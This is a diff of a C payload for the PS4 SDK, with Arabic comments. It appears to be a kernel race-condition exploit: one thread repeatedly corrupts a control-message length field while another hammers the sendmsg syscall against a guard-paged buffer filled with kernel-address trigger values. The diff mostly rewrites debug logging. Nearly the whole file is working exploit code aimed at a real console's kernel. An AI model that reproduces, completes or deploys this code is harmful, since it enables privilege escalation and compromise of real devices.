@@ -1,19 +1,18 @@
 #include <ps4.h>
 
-// --- تعريف الهياكل المفقودة ---
+// --- تعريف الهياكل المفقودة التي لا تتعارض مع kernel.h ---
 struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };
 struct msghdr {
     void *msg_name; uint32_t msg_namelen; struct iovec *msg_iov;
     int msg_iovlen; void *msg_control; uint32_t msg_controllen; int msg_flags;
 };
 
+// هيكل الـ CPU Set المتوافق مع PS4/FreeBSD
 typedef struct { uint64_t bits[16]; } cpuset_t;
 #define CPU_SET(n, p) ((p)->bits[(n)/64] |= (1ULL << ((n)%64)))
 #define CPU_ZERO(p) memset((p), 0, sizeof(cpuset_t))
 
-// الوظيفة المستوردة لربط الأنوية
-int (*pthread_setaffinity_np)(ScePthread thread, size_t cpusetsize, const cpuset_t *cpuset);
-
+// --- المتغيرات العامة ---
 #define PS4_PAGE_SIZE 0x4000
 #define OVERFLOW_SIZE 256 
 #define NCMSG         14
@@ -24,39 +23,32 @@ struct cmsghdr *ControlBuf;
 size_t ControlBufLen;
 volatile int stop_race = 0;
 uint64_t n_tries = 0;
-uint64_t n_efaults = 0;
 
-// --- 1. بناء البفر مع Debugging للحسابات ---
+// --- 1. بناء البفر مع تقارير Debug ---
 void BuildPrecisionBuffer(uint64_t kbase) {
-    printf_debug("[DEBUG] Entering BuildPrecisionBuffer...\n");
+    printf_debug("[BUILD] Starting buffer preparation...\n");
     
     size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
     size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);
     
-    printf_debug("[DEBUG] Calculated allocsz: 0x%zx, cmsgsize: 0x%zx\n", allocsz, cmsgsize);
-
     // حجز الذاكرة
-    BaseArea = (uint8_t *)mmap(NULL, allocsz + PS4_PAGE_SIZE, PROT_READ|PROT_WRITE, 0x0002 | 0x1000, -1, 0);
+    BaseArea = (uint8_t *)mmap(NULL, allocsz + PS4_PAGE_SIZE, PROT_READ | PROT_WRITE, 0x0002 | 0x1000, -1, 0);
     if (BaseArea == (uint8_t *)-1) {
-        printf_debug("[ERROR] mmap failed! errno: %d\n", errno);
+        printf_debug("[ERROR] mmap failed (errno: %d)\n", errno);
         return;
     }
-    printf_debug("[DEBUG] BaseArea mapped at: %p\n", BaseArea);
+    printf_debug("[BUILD] Memory mapped at: %p\n", BaseArea);
 
-    // حماية الصفحة الثانية
+    // حماية صفحة الـ EFAULT
     if (mprotect(BaseArea + allocsz, PS4_PAGE_SIZE, PROT_NONE) != 0) {
-        printf_debug("[ERROR] mprotect failed! errno: %d\n", errno);
-    } else {
-        printf_debug("[DEBUG] Guard page set at: %p\n", BaseArea + allocsz);
+        printf_debug("[ERROR] mprotect failed!\n");
     }
 
     // محاذاة البفر
     uint8_t *aligned_base = BaseArea + (allocsz - (cmsgsize + OVERFLOW_SIZE));
     ControlBuf = (struct cmsghdr *)aligned_base;
     ControlBufLen = cmsgsize;
-    printf_debug("[DEBUG] ControlBuf aligned at: %p\n", ControlBuf);
 
-    // ملء البيانات
     for (int i = 0; i < NCMSG; i++) {
         ControlBuf[i].cmsg_len = sizeof(struct cmsghdr);
         ControlBuf[i].cmsg_type = 7;
@@ -67,23 +59,21 @@ void BuildPrecisionBuffer(uint64_t kbase) {
     for (int i = 0; i < OVERFLOW_SIZE; i += 8) {
         *(uintptr_t *)(overflow_ptr + i) = trigger;
     }
-    printf_debug("[DEBUG] Payload armed with trigger: 0x%llx\n", trigger);
+    printf_debug("[BUILD] Payload armed at: %p\n", overflow_ptr);
 }
 
 // --- 2. خيط التخريب (Wrecker) ---
 void *wrecker_thread(void *arg) {
     (void)arg;
-    printf_debug("[DEBUG] Wrecker thread started on Core 1\n");
-    
+    printf_debug("[WRECKER] Thread alive on Core 1\n");
     while (!stop_race) {
         ControlBuf[NCMSG-1].cmsg_len = sizeof(struct cmsghdr);
-        for(volatile int i=0; i<150; i++); // تأخير المزامنة
+        for(volatile int i=0; i<150; i++); 
         
-        ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF; // الهجوم
+        ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF;
         for(volatile int i=0; i<150; i++);
     }
-    
-    printf_debug("[DEBUG] Wrecker thread exiting...\n");
+    printf_debug("[WRECKER] Thread stopping...\n");
     return NULL;
 }
 
@@ -96,26 +86,19 @@ void *executor_thread(void *arg) {
     msg.msg_controllen = (uint32_t)ControlBufLen;
     const int bad_fd = 666;
 
-    printf_debug("[DEBUG] Executor thread started on Core 2\n");
-
+    printf_debug("[EXEC] Thread alive on Core 2\n");
     while (!stop_race) {
         n_tries++;
-        
-        // محاولة الاستغلال
         syscall(28, bad_fd, &msg, 0); 
         
-        // فحص حالة الخطأ
-        int err = errno;
-        if (err == 14) { // EFAULT
-            n_efaults++;
+        if (errno == 14) { // EFAULT
             stop_race = 1;
-            printf_debug("[!!!] SUCCESS: EFAULT detected at try #%llu\n", n_tries);
+            printf_debug("[SUCCESS] EFAULT CAUGHT! Tries: %llu\n", n_tries);
             break;
-        } 
+        }
         
-        // Log كل 50 ألف محاولة للتأكد أن النظام لم يتجمد
-        if (n_tries % 50000 == 0) {
-            printf_debug("[INFO] Still racing... Tries: %llu, Last errno: %d\n", n_tries, err);
+        if (n_tries % 100000 == 0) {
+            printf_debug("[EXEC] Pulse check: %llu tries...\n", n_tries);
         }
     }
     return NULL;
@@ -125,44 +108,34 @@ int _main(struct thread *td) {
     (void)td;
     initKernel(); initLibc(); initSysUtil();
     
-    printf_debug("\n--- PS4 KERNEL RACE DEBUG MODE ---\n");
-
-    // جلب الوظائف الحيوية
-    int libKernelHandle = sceKernelLoadStartModule("/system/common/lib/libkernel.sprx", 0, NULL, 0, NULL, NULL);
-    if (libKernelHandle <= 0) {
-        printf_debug("[ERROR] Could not load libkernel\n");
-        return -1;
-    }
-    RESOLVE(libKernelHandle, pthread_setaffinity_np);
-    printf_debug("[DEBUG] pthread_setaffinity_np resolved\n");
+    printf_debug("\n--- [PS4 RACE DEBUG START] ---\n");
 
     uint64_t kbase = get_kernel_base();
-    printf_debug("[DEBUG] Kernel Base: 0x%llx\n", kbase);
+    printf_debug("[INFO] Kernel Base: 0x%llx\n", kbase);
 
     BuildPrecisionBuffer(kbase);
 
-    // إعداد الأنوية
+    // إعداد الأنوية باستخدام التعريفات الموجودة في libPS4
     cpuset_t cpuset1, cpuset2;
     CPU_ZERO(&cpuset1); CPU_SET(1, &cpuset1);
     CPU_ZERO(&cpuset2); CPU_SET(2, &cpuset2);
 
     ScePthread wrid, exid;
     
-    printf_debug("[DEBUG] Launching threads...\n");
-    
+    // إنشاء الخيوط وربطها بالأنوية
     scePthreadCreate(&wrid, NULL, wrecker_thread, NULL, "wrecker");
     pthread_setaffinity_np(wrid, sizeof(cpuset_t), &cpuset1);
+    printf_debug("[INFO] Wrecker bound to Core 1\n");
 
     scePthreadCreate(&exid, NULL, executor_thread, NULL, "executor");
     pthread_setaffinity_np(exid, sizeof(cpuset_t), &cpuset2);
+    printf_debug("[INFO] Executor bound to Core 2\n");
 
-    // الانتظار
+    // الانتظار حتى النجاح
     scePthreadJoin(exid, NULL);
     stop_race = 1;
     scePthreadJoin(wrid, NULL);
 
-    printf_debug("[DEBUG] Race finished. Total tries: %llu\n", n_tries);
-    printf_debug("--- END OF DEBUG ---\n");
-
+    printf_debug("[FINISH] Exploit loop exited.\n");
     return 0;
 }
